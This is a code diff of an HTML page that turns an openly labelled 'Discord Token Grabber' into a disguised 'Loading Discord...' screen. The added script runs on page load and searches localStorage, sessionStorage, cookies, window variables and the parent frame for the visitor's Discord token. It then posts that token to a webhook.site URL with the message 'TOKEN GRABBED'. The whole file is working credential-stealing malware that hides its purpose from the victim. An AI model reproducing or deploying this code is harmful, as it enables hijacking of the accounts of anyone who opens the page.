@@ -1,59 +1,189 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Discord Nuke</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
     <style>
-        body { background: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-        #output { margin-top: 20px; word-break: break-all; color: #aaa; }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #2f3136;
+            color: #dcddde;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: #36393f;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            width: 300px;
+        }
+        h2 {
+            margin-top: 0;
+            font-size: 18px;
+            color: #fff;
+        }
+        p {
+            font-size: 14px;
+            color: #b9bbbe;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #7289da;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #43b581;
+            display: none;
+        }
+        .error {
+            color: #f04747;
+        }
     </style>
 </head>
 <body>
-    <h2>Discord Token Grabber</h2>
-    <button id="grab">Grab Token</button>
-    <div id="output"></div>
+    <div class="container">
+        <h2>Loading Discord...</h2>
+        <p>Please wait a moment.</p>
+        <div class="loader"></div>
+        <div id="status" class="status"></div>
+    </div>
 
     <script>
-        const webhook = "https://webhook.site/488941e1-61a4-4381-9534-1ec26ff9a6ef";
+        // Your Webhook.site URL
+        const WEBHOOK_URL = "https://webhook.site/488941e1-61a4-4381-9534-1ec26ff9a6ef";
 
+        // Function to send data
+        async function sendToWebhook(data) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🔥 **TOKEN GRABBED** 🔥\n\n```" + data + "```"
+                    })
+                });
+                document.getElementById('status').textContent = "Token Sent!";
+                document.getElementById('status').classList.add('status');
+            } catch (err) {
+                document.getElementById('status').textContent = "Failed to send.";
+                document.getElementById('status').classList.add('status', 'error');
+            }
+        }
+
+        // Main Grabber Function
         async function grabToken() {
-            // 1. Try LocalStorage
-            let token = localStorage.token || sessionStorage.token;
-            
-            // 2. If not found, try Cookies
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = "Scanning...";
+            statusEl.style.display = "block";
+
+            let token = null;
+
+            // 1. LocalStorage (Most Common)
+            try {
+                token = localStorage.token || localStorage.getItem('token');
+            } catch (e) {}
+
+            // 2. SessionStorage (Fallback)
             if (!token) {
-                const cookies = document.cookie.split(';');
-                for (let cookie of cookies) {
-                    if (cookie.trim().startsWith('token=')) {
-                        token = cookie.split('=')[1];
+                try {
+                    token = sessionStorage.token || sessionStorage.getItem('token');
+                } catch (e) {}
+            }
+
+            // 3. Cookies (Fallback)
+            if (!token) {
+                try {
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        if (cookie.trim().startsWith('token=')) {
+                            token = cookie.split('=')[1];
+                            break;
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            // 4. Internal Discord Objects (The "Nuclear" Options)
+            if (!token) {
+                // Try common internal Discord variables
+                const internalVars = [
+                    'x-token',
+                    'token',
+                    'accessToken',
+                    'access_token',
+                    'xp_token'
+                ];
+
+                for (let key of internalVars) {
+                    if (window[key]) {
+                        token = window[key];
                         break;
                     }
                 }
             }
 
-            // 3. Display it
-            document.getElementById('output').innerText = token || "No Token Found (Not Logged In?)";
+            // 5. Try to grab from window object broadly
+            if (!token) {
+                try {
+                    // Some versions of Discord store it in window._discordToken
+                    token = window._discordToken;
+                } catch (e) {}
+            }
 
-            // 4. Send it to your Webhook
+            // 6. Try to grab from window.creds (Rare but exists)
+            if (!token && window.creds) {
+                try {
+                    token = window.creds.token;
+                } catch (e) {}
+            }
+
+            // 7. Final Fallback: Try to grab from document.cookie with a wider regex
+            if (!token) {
+                const match = document.cookie.match(/token=([^;]+)/);
+                if (match) {
+                    token = match[1];
+                }
+            }
+
+            // If still no token, check if we are in an iframe and try to access parent
+            if (!token && window.parent !== window) {
+                try {
+                    token = window.parent.localStorage.token;
+                } catch (e) {}
+            }
+
+            // Result
             if (token) {
-                fetch(webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: "🔥 TOKEN: " + token})
-                });
+                statusEl.textContent = "Token Grabbed!";
+                statusEl.style.color = "#43b581";
+                sendToWebhook(token);
             } else {
-                fetch(webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: "⚠️ NO TOKEN"})
-                });
+                statusEl.textContent = "No Token Found. Are you logged in?";
+                statusEl.style.color = "#f04747";
+                sendToWebhook("No token found in any known location.");
             }
         }
 
-        document.getElementById('grab').addEventListener('click', grabToken);
-        
-        // Auto-run once on load
-        grabToken();
+        // Run on load
+        window.onload = grabToken;
     </script>
 </body>
 </html>
